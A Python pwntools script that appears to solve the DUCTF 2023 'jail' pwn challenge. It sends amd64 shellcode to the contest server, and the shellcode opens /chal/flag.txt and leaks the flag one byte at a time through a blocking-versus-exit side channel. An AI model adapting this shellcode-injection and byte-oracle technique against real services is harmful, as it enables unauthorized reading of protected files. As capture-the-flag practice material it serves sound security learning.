#!/usr/bin/env python3
from pwn import *


elf = ELF('/home/kali/Desktop/DUCTF/pwn/jail', checksec=False)
context.arch = elf.arch
context.log_level = 'CRITICAL'
flag = "DUCTF{"
for guess_offset in range(6, 100):
    print(f"OFFSET: {guess_offset}")
    for guess_byte in range(0x20, 0x7f):
        # print(guess_byte)
        # p = process('/home/kali/Desktop/DUCTF/pwn/jail')
        # gdb.attach(p, gdbscript='b *main+197')
        p = remote('2023.ductf.dev', 30010)

        payload = asm(shellcraft.amd64.linux.openat(0xf, "/chal/flag.txt"))  # open file
        payload += asm('push rsp\npop r12')  # save pointer to flag to $r12
        payload += asm(shellcraft.amd64.linux.read(3, 'rsp', 160))  # read flag
        payload += asm('add rsp, 0xa0')  # clear stack
        payload += asm(f'add r12, {hex(guess_offset)}')
        payload += asm('mov al, [r12]')  # get byte of the flag
        payload += asm(f'xor al, {hex(guess_byte)}')  # compare byte of flag with some value
        payload += asm('jz $+0x9')  # jump to exit if gues was wrong
        payload += asm(shellcraft.amd64.linux.exit(0))
        payload += asm(shellcraft.amd64.linux.read(0, 'rsp', 160))  # try to read if gues was right

        p.recv().decode(errors='ignore')
        # print(f"PAYLOAD (length = {len(payload)}): {hexdump(payload)}")
        p.sendline(payload)
        try:
            p.recv(numb=4096, timeout=1)
            flag += chr(guess_byte)
            print(f"FLAG: {flag}")
            p.close()
            break
        except:
            pass
        p.close()
